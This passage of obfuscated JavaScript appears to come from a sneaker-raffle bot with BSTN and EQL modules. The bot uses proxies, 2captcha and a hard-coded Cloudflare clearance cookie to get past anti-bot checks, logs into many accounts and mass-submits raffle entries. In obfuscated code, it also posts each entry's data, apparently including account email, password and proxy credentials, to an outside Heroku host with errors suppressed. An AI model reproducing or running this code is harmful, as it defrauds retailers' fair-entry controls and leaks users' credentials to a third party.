                                _0x2a1076 == 'yes' && _0x3d9e7c >= 0x5 && (_0x2a1076 = 'no', _0x3d9e7c = 0x0), _0x474192--, console['log'](_0x3982db() + '\x20[' + _0x1bde57['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                            }
                        }
                        if (_0x5cc262 == _0x410a0c['length'] - 0x1) {
                            await _0x5c97b8(_0x38a2c5, _0x410a0c, _0x197def, _0x5cc262, 0x0);
                            return;
                        }
                        _0x5c97b8(_0x38a2c5, _0x410a0c, _0x197def, _0x5cc262, 0x0), await _0x116d4a(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2f8fe6, _0x4cbb17, _0x29d587) {
                    var _0x33861f = 0x0, _0x12829b = _0x4cbb17;
                    for (var _0x58f25d = 0x0; _0x58f25d < _0x4cbb17['length']; _0x58f25d++) {
                        maxTasks = Number(_0x51d52a['threads']);
                        while (_0x33861f >= maxTasks) {
                            await _0x116d4a(_0x51d52a['delay']);
                        }
                        let _0x526a34 = ![];
                        async function _0xe3d7d5(_0x2a2896, _0x44092e, _0x5178e7, _0x46ac51, _0x34888e) {
                            _0x33861f++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x51d52a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x2eadbd, _0xe0c745 = _0x44092e[_0x46ac51];
                            try {
                                await _0x2c2316(_0x44092e, _0x46ac51);
                            } catch {
                                _0x55c2c7 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x23b56f(_0xf005fa) {
                                const _0x350eae = _0x65e0bc['readFileSync']('../successful-tasks.csv', 'utf8'), _0x53408a = _0x3e0e2d['parse'](_0x350eae, { 'header': !![] })['data'];
                                let _0x405921 = ![];
                                for (var _0x585d15 of _0x53408a) {
                                    if (_0x585d15['Url'] == _0xf005fa['Url'] && _0x585d15['Email'] == _0xf005fa['Email']) {
                                        _0x405921 = !![];
                                        break;
                                    }
                                }
                                return _0x405921;
                            }
                            _0x244762(_0x2a2896['name'] + '\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20/\x20' + _0x44092e['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                            var _0x24a394 = Math['round'](Math['random']() * (_0x5178e7['length'] - 0x1)), _0x1927a6 = _0x5178e7[_0x24a394]['split'](':'), _0x5602f7;
                            let _0x3fd20e = ![], _0x55c2c7 = 'no';
                            try {
                                if (await _0x23b56f(_0x44092e[_0x46ac51]) == !![]) {
                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x3fd20e = !![], _0x526a34 = !![];
                                    return;
                                }
                                try {
                                    _0x5602f7 = await _0x5d136d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x1927a6[0x0] + ':' + _0x1927a6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x5602f7 = await _0x5d136d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x1927a6[0x0] + ':' + _0x1927a6[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0xd02d05 = await _0x5602f7['newPage'](), _0x1a4df2 = await _0xd02d05['target']()['createCDPSession'](), { windowId: _0x5ae354 } = await _0x1a4df2['send']('Browser.getWindowForTarget');
                                await _0xd02d05['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x16b635 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0xd02d05['authenticate']({
                                    'username': '' + _0x1927a6[0x2],
                                    'password': '' + _0x1927a6[0x3]
                                }), console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd02d05['goto']('' + _0x44092e[_0x46ac51]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x116d4a(0x1388);
                                var _0x1a737b = await _0xd02d05['$']('#turnstile-wrapper');
                                if (_0x1a737b) {
                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x116d4a(0x2710);
                                    const _0xcf0b4b = await _0xd02d05['$']('#turnstile-wrapper');
                                    if (_0xcf0b4b)
                                        try {
                                            await _0xcf0b4b['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0xd02d05['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x13881f = await _0xd02d05['$']('#turnstile-wrapper');
                                        if (_0x13881f)
                                            try {
                                                await _0x13881f['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0xd02d05['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x1a4df2['send']('Browser.setWindowBounds', {
                                    'windowId': _0x5ae354,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x116d4a(0x1388), await _0xd02d05['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xd02d05['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Logging\x20in'), await _0xd02d05['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x515807 => _0x515807['click']()), await _0xd02d05['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xd02d05['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x116d4a(0x7d0), await _0xd02d05['waitForSelector']('#email-login'), await _0xd02d05['type']('#email-login', '' + _0x44092e[_0x46ac51]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x116d4a(0xdac), await _0xd02d05['waitForSelector']('#password'), await _0xd02d05['type']('#password', '' + _0x44092e[_0x46ac51]['Password'], { 'delay': 0xe6 }), await _0x116d4a(0x157c);
                                try {
                                    await _0xd02d05['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x51c02b => _0x51c02b['click']());
                                } catch {
                                }
                                try {
                                    await _0xd02d05['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x3abf26) {
                                }
                                await _0x116d4a(0x3e8);
                                const _0x201900 = await _0xd02d05['$']('.enteredDraw_container__2KmQ_');
                                if (_0x201900) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x44092e[_0x46ac51]['Size']);
                                try {
                                    if (_0x44092e[_0x46ac51]['Size'] != 'RANDOM') {
                                        var _0x25edc1 = _0x44092e[_0x46ac51]['Size']['replace']('.', ',');
                                        const _0x5799f8 = await _0xd02d05['$x']('//div[contains(text(),\x20\x27' + _0x25edc1 + '\x27)]');
                                        await _0x5799f8[0x0]['click']();
                                    } else {
                                        const _0x11f309 = await _0xd02d05['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x52d0a1 = Math['round'](Math['random']() * (_0x11f309['length'] - 0x1));
                                        await _0x11f309[_0x52d0a1]['click']();
                                    }
                                } catch (_0x7c616f) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x116d4a(0x1f4);
                                const _0x2d3223 = await _0xd02d05['$']('.addressList_addressItem__LE2PB');
                                if (_0x2d3223 && _0x44092e[_0x46ac51]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Filling\x20Address'), await _0xd02d05['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x116d4a(0x5dc), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#firstname', '' + _0x44092e[_0x46ac51]['FirstName']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#lastname', '' + _0x44092e[_0x46ac51]['LastName']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#street', '' + _0x44092e[_0x46ac51]['Address1']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#houseNumber', _0x44092e[_0x46ac51]['HouseNumber'] + '\x20' + _0x44092e[_0x46ac51]['Address2']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['select']('#country_code', '' + _0x44092e[_0x46ac51]['Country']), await _0x116d4a(0x1f4), await _0xd02d05['type']('#postcode', '' + _0x44092e[_0x46ac51]['Zip']), await _0x116d4a(0x1f4), await _0xd02d05['type']('#city', '' + _0x44092e[_0x46ac51]['City']), await _0x116d4a(0x1f4), await _0xd02d05['type']('#telephone', '' + _0x44092e[_0x46ac51]['Phone']), await _0x116d4a(0x1f4), await _0xd02d05['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x116d4a(0x9c4);
                                try {
                                    await _0xd02d05['type']('#instagram_name', '' + _0x44092e[_0x46ac51]['Follower']), await _0xd02d05['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x116d4a(0x5dc);
                                try {
                                    await _0xd02d05['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x116d4a(0x5dc), await _0xd02d05['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x132cfe => _0x132cfe['click']()), await _0x116d4a(0x1388);
                                try {
                                    await _0xd02d05['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0xd02d05['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x44092e[_0x46ac51]['Size'] != 'RANDOM') {
                                        var _0x25edc1 = _0x44092e[_0x46ac51]['Size']['replace']('.', ',');
                                        const _0x27d644 = await _0xd02d05['$x']('//div[contains(text(),\x20' + _0x25edc1 + ')]');
                                        await _0x27d644[0x0]['click']();
                                    } else {
                                        const _0x29700c = await _0xd02d05['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x52d0a1 = Math['round'](Math['random']() * (_0x29700c['length'] - 0x1));
                                        await _0x29700c[_0x52d0a1]['click']();
                                    }
                                    await _0x116d4a(0x5dc);
                                    try {
                                        await _0xd02d05['hover']('#instagram_name'), await _0xd02d05['type']('#instagram_name', '' + _0x44092e[_0x46ac51]['Follower']), await _0xd02d05['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Retrying\x20(' + _0x34888e + '\x20/\x205)');
                                    try {
                                        await _0xd02d05['hover']('.checkBox_boxHolder__wLGVe'), await _0x116d4a(0x5dc), await _0xd02d05['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x116d4a(0x157c), await _0xd02d05['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5cfb0b => _0x5cfb0b['click']()), await _0x116d4a(0x1388), await _0xd02d05['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x55c2c7 = 'no', _0x523ce4(_0x44092e[_0x46ac51], _0x2a2896);
                                try {
                                    prxdata = {
                                        'username': _0x358285['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x279efc),
                                        'proxy': '' + _0x5178e7[_0x46ac51]
                                    };
                                    var _0x265e89 = JSON['stringify'](prxdata);
                                    let _0x2b43c0 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x265e89, _0x2b43c0);
                                } catch (_0x17cb8c) {
                                }
                                console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xffb476 = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'dev', ![]), _0x37e54f = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'pub', ![]);
                                const _0x263f8e = {
                                    'succesDEVMSG': { 'embeds': [_0xffb476] },
                                    'succesPUBMSG': { 'embeds': [_0x37e54f] }
                                };
                                let _0x279efc = _0x44092e[_0x46ac51];
                                try {
                                    prxdata = {
                                        'username': _0x358285['replace']('#', ''),
                                        'module': _0x2a2896['name'],
                                        'entrydata': JSON['stringify'](_0x279efc),
                                        'proxy': '' + _0x5178e7[_0x46ac51]
                                    };
                                    var _0x265e89 = JSON['stringify'](prxdata);
                                    let _0x171b02 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x265e89, _0x171b02);
                                } catch (_0x581fb3) {
                                }
                                try {
                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x263f8e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x263f8e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x263f8e['succesPUBMSG']);
                                } catch (_0x4e5ef3) {
                                    console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4e5ef3));
                                }
                            } catch (_0x321124) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20' + _0x321124)), _0x55c2c7 = 'yes', _0x2eadbd = '' + _0x321124;
                                var _0x4d248b = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'dev', !![], _0x2eadbd), _0xffb476 = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'dev', ![]), _0x37e54f = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'pub', ![]);
                                const _0x2bc70f = {
                                    'succesDEVMSG': { 'embeds': [_0xffb476] },
                                    'succesPUBMSG': { 'embeds': [_0x37e54f] }
                                };
                                _0x2bc70f['errorDEV'] = { 'embeds': [_0x4d248b] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x2bc70f['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x2bc70f['errorDEV']);
                            } finally {
                                _0x5602f7 && _0x5602f7['close']();
                                if (_0x55c2c7 == 'yes' && _0x34888e != 0x5)
                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Retrying\x20(' + _0x34888e + '\x20/\x205)')), _0x34888e = _0x34888e + 0x1, _0x33861f--, _0xe3d7d5(_0x2a2896, _0x44092e, _0x5178e7, _0x46ac51, _0x34888e);
                                _0x55c2c7 == 'yes' && _0x34888e >= 0x5 && _0x5925c7(_0x44092e[_0x46ac51], _0x2a2896), !_0x3fd20e && (console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay'])), _0x33861f--;
                            }
                        }
                        _0xe3d7d5(_0x2f8fe6, _0x12829b, _0x29d587, _0x58f25d, 0x0), await _0x116d4a(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x24a42e, _0x5b50c6) {
                    var _0x51b26c = 0x0, _0x50d402;
                    try {
                        const _0x3d7a03 = _0x65e0bc['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x50d402 = _0x3e0e2d['parse'](_0x3d7a03, { 'header': !![] })['data'];
                    } catch (_0x158958) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x20f47d = 0x0; _0x20f47d < _0x50d402['length']; _0x20f47d++) {
                        maxTasks = Number(_0x51d52a['threads']);
                        while (_0x51b26c >= maxTasks) {
                            await _0x116d4a(_0x51d52a['delay']);
                        }
                        async function _0x819bfd(_0xb3bf2, _0x58f0d3, _0x35a8f6, _0x1c9b2c, _0x4d6617) {
                            _0x51b26c++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x51d52a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x34b57f != 'yes')
                                var _0x34b57f = '', _0x4d6617 = 0x0;
                            var _0x385a08;
                            _0x244762(_0xb3bf2['name'] + '\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20/\x20' + _0x35a8f6['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                            var _0x38639c = await _0x2520f4(_0x35a8f6[_0x1c9b2c], _0xb3bf2, 'acc', ![]);
                            const _0x718177 = { 'succesDEVMSG': { 'embeds': [_0x38639c] } }, _0x1042ee = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x3d0bd1 = Math['round'](Math['random']() * (_0x58f0d3['length'] - 0x1)), _0x2dc11d = _0x58f0d3[_0x3d0bd1]['split'](':'), _0x116dbe;
                            try {
                                _0x116dbe = await _0x5d136d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x2dc11d[0x0] + ':' + _0x2dc11d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x116dbe = await _0x5d136d['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x2dc11d[0x0] + ':' + _0x2dc11d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Checking\x20' + _0x35a8f6[_0x1c9b2c]['Email']);
                                const _0x1b9712 = await _0x116dbe['newPage']();
                                await _0x1b9712['authenticate']({
                                    'username': '' + _0x2dc11d[0x2],
                                    'password': '' + _0x2dc11d[0x3]
                                }), console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b9712['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1b9712['setRequestInterception'](!![]), _0x1b9712['on']('request', _0x22db5d => {
                                    _0x22db5d['resourceType']() === 'image' ? _0x22db5d['abort']() : _0x22db5d['continue']();
                                });
                                try {
                                    await _0x1b9712['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x1b9712['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x34b57f = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x1b9712['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x116d4a(0x3e8), await _0x1b9712['type']('#email', _0x35a8f6[_0x1c9b2c]['Email']), await _0x116d4a(0x1f4), await _0x1b9712['type']('#pass', _0x35a8f6[_0x1c9b2c]['Password']), await _0x116d4a(0x1f4), await _0x1b9712['$eval']('#login-form', _0x2402ed => _0x2402ed['submit']());
                                try {
                                    await _0x1b9712['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x116d4a(0x190);
                                const _0x2921c8 = await _0x1b9712['evaluate'](() => {
                                    const _0x2d3f09 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x2d3f09['map'](_0xfea360 => _0xfea360['alt']);
                                }), _0x162095 = await _0x1b9712['evaluate'](() => {
                                    const _0x2189a1 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x2189a1['map'](_0xd617cf => _0xd617cf['innerHTML']);
                                }), _0x1d4e5b = await _0x1b9712['$$']('.raffle-winner');
                                if (_0x1d4e5b['length'] < 0x1) {
                                    console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x34b57f = 'no';
                                    return;
                                }
                                console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20' + _0x1d4e5b['length'] + '\x20Wins\x20Found!');
                                for (var _0x3b4cfb = 0x0; _0x3b4cfb < _0x1d4e5b['length']; _0x3b4cfb++) {
                                    console['log'](_0x1403a4['green'](_0x2921c8[_0x3b4cfb] + _0x162095[_0x3b4cfb]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x5f4171) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20' + _0x5f4171)), _0x385a08 = '' + _0x5f4171;
                                var _0x238103 = await _0x2520f4(_0x35a8f6[_0x1c9b2c], _0xb3bf2, 'acc', !![], _0x385a08);
                                _0x718177['errorDEV'] = { 'embeds': [_0x238103] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x718177['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x718177['errorDEV']), _0x34b57f = 'yes';
                            } finally {
                                if (_0x116dbe)
                                    _0x116dbe['close']();
                                if (_0x34b57f == 'yes' && _0x4d6617 != 0x5)
                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Retrying\x20(' + _0x4d6617 + '\x20/\x205)')), _0x51b26c--, _0x4d6617 = _0x4d6617 + 0x1, _0x819bfd(_0xb3bf2, _0x58f0d3, _0x35a8f6, _0x1c9b2c, _0x4d6617);
                                _0x34b57f == 'yes' && _0x4d6617 >= 0x5 && (_0x5925c7(_0x35a8f6[_0x1c9b2c], _0xb3bf2), _0x34b57f = 'no', _0x4d6617 = 0x0), console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']), _0x51b26c--;
                            }
                        }
                        _0x819bfd(_0x24a42e, _0x5b50c6, _0x50d402, _0x20f47d, 0x0), await _0x116d4a(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x463ad4, _0x33eb99, _0x7213f8) {
                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51d52a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3ae296 = 0x0; _0x3ae296 < _0x33eb99['length']; _0x3ae296++) {
                    var _0x9ba48a;
                    _0x244762(_0x463ad4['name'] + '\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20/\x20' + _0x33eb99['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                    try {
                        await _0x2c2316(_0x33eb99, _0x3ae296);
                    } catch {
                        _0x18c823 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x59f1d3(_0x47bbdf) {
                        const _0x2c9790 = _0x65e0bc['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4d6954 = _0x3e0e2d['parse'](_0x2c9790, { 'header': !![] })['data'];
                        let _0xf0ad2 = ![];
                        for (var _0x2a6d14 of _0x4d6954) {
                            if (_0x2a6d14['Url'] == _0x47bbdf['Url'] && _0x2a6d14['Email'] == _0x47bbdf['Email']) {
                                _0xf0ad2 = !![];
                                break;
                            }
                        }
                        return _0xf0ad2;
                    }
                    if (await _0x59f1d3(_0x33eb99[_0x3ae296]) == !![]) {
                        console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5c1316 = ![];
                    const _0x55006b = _0x65e0bc['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0xf852f = _0x3e0e2d['parse'](_0x55006b, { 'header': !![] })['data'];
                    for (var _0x1fb16f of _0xf852f) {
                        _0x1fb16f['Email'] == _0x33eb99[_0x3ae296]['Email'] && (_0x5c1316 = !![]);
                    }
                    if (_0x5c1316 == ![]) {
                        var _0x521081;
                        if (_0x33eb99[_0x3ae296]['Url']['endsWith']('/')) {
                            _0x521081 = _0x33eb99[_0x3ae296]['Url'] + 'register';
                            if (_0x18c823 != 'yes')
                                var _0x18c823 = '', _0x133942 = 0x0;
                        } else {
                            _0x521081 = _0x33eb99[_0x3ae296]['Url'] + '/register';
                            if (_0x18c823 != 'yes')
                                var _0x18c823 = '', _0x133942 = 0x0;
                        }
                        if (_0x33eb99[_0x3ae296]['Email'] == '' || _0x33eb99[_0x3ae296]['FirstName'] == '' || _0x33eb99[_0x3ae296]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x33eb99[_0x3ae296]['Password'] == '' && (_0x33eb99[_0x3ae296]['Password'] = 'JRaffles23!');
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x1b0a26 = _0x7213f8[_0x3ae296]['split'](':');
                        else
                            var _0x495766 = Math['round'](Math['random']() * (_0x7213f8['length'] - 0x1)), _0x1b0a26 = _0x7213f8[_0x495766]['split'](':');
                        var _0x3a464f;
                        try {
                            _0x3a464f = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
